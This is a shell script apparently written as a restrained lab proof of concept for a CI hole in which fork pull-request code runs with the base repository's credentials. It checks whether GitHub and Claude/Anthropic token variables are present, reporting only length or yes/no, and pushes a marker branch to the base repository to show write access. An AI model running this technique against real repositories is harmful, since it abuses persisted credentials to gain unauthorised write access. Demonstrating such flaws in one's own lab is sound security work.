#!/bin/sh
# L1 lab proof (harmless). Runs only in the user's own lab repo.
echo "L1-PROOF: running inside: ${GITHUB_REPOSITORY:-unknown} run ${GITHUB_RUN_ID:-?}"
echo "L1-PROOF: GITHUB_TOKEN present, length=$(printf %s "${GITHUB_TOKEN:-}" | wc -c)"   # length only
echo "L1-PROOF: CLAUDE token var present: $( [ -n "${CLAUDE_CODE_OAUTH_TOKEN:-}${ANTHROPIC_API_KEY:-}" ] && echo yes || echo no )"
marker="l1-proof-${GITHUB_RUN_ID:-local}"
printf 'L1 marker written by fork-PR code at %s\n' "$(date -u +%FT%TZ)" > l1-marker.txt
git -c user.name=l1-lab -c user.email=l1-lab@example.invalid commit -q --allow-empty -m "L1 lab marker" -- l1-marker.txt 2>/dev/null || { git add l1-marker.txt; git -c user.name=l1-lab -c user.email=l1-lab@example.invalid commit -q -m "L1 lab marker"; }
# push to the BASE repo (origin) using the job's persisted credentials
if git push -q origin "HEAD:refs/heads/${marker}" 2>/dev/null; then
  echo "L1-PROOF: pushed branch ${marker} to origin (base repo) -> write access from fork code"
else
  echo "L1-PROOF: push to origin failed"
fi
